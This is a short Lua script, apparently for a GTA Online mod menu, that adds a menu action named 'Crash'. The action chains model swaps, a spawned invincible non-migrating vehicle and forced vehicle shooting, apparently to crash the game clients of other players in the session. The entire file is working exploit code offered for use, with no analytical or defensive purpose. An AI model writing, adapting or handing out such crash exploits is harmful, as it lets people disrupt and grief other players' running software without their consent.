util.require_natives(1672190175)
function Playerjoin(pid)


menu.action(menu.my_root(), "Crash", {""}, "", function()
	STREAMING.REQUEST_MODEL(util.joaat("buccaneer2"))
	while not STREAMING.HAS_MODEL_LOADED(util.joaat("buccaneer2")) do
        util.yield()
    end
   	menu.trigger_commands("bottomless on")
	menu.trigger_commands("noreload on")
	
    menu.trigger_commands("csbmpagent14") -- csbmpagent14 iglestercrest igorleans
	local player = players.user_ped()
	util.yield(1000)
	PED.SET_PED_HEAD_BLEND_DATA(player, 0, 0, 0, 0, 0, 0, 0.0, 0.0, 0.0,true)
		for i = 1, 3 do
        TASK.TASK_JUMP(player,true,false,false)
		util.yield(500)
		TASK.CLEAR_PED_TASKS_IMMEDIATELY(player)
		end
		
   local pos = ENTITY.GET_ENTITY_COORDS(player)
   local veh = entities.create_vehicle(util.joaat("buccaneer2"), pos,0)
   STREAMING.SET_MODEL_AS_NO_LONGER_NEEDED(util.joaat("buccaneer2"))
   entities.set_can_migrate(veh,false)
   VEHICLE.SET_VEHICLE_EXTRA(veh,2,true)
   ENTITY.SET_ENTITY_INVINCIBLE(veh,true)
   WEAPON.GIVE_WEAPON_TO_PED(player,util.joaat("WEAPON_APPISTOL"),9999,true,true)
   PED.SET_PED_INTO_VEHICLE(player,veh,-1)
   WEAPON.SET_CURRENT_PED_WEAPON(player,util.joaat("WEAPON_APPISTOL"),true)
   
   TASK.TASK_VEHICLE_SHOOT_AT_COORD(player,pos.x,pos.y + 10,pos.z,100.0)
   local time = util.current_time_millis() + 5000
   while time > util.current_time_millis() do
   PED.SET_PED_RESET_FLAG(player, 65 , true)  -- shooting
   util.yield()
   end
   entities.delete(veh)
end)


end
players.on_join(Playerjoin)
players.dispatch_on_join()
util.keep_running()